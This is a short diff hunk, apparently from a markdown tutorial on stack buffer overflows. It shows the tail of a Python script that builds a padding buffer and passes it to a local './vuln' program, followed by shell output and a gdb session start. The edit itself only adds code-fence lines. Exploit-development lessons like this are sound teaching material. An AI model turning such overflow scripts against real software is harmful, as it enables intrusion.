@@ -185,6 +185,9 @@ buf += "B" * 4
 buf += "A" * 80
 print "Calling vulnerable program"
 call(["./vuln", buf])
+```
+
+``` bash
 $ python exp_tst.py 
 Calling vulnerable program
 $ sudo gdb -q vuln 
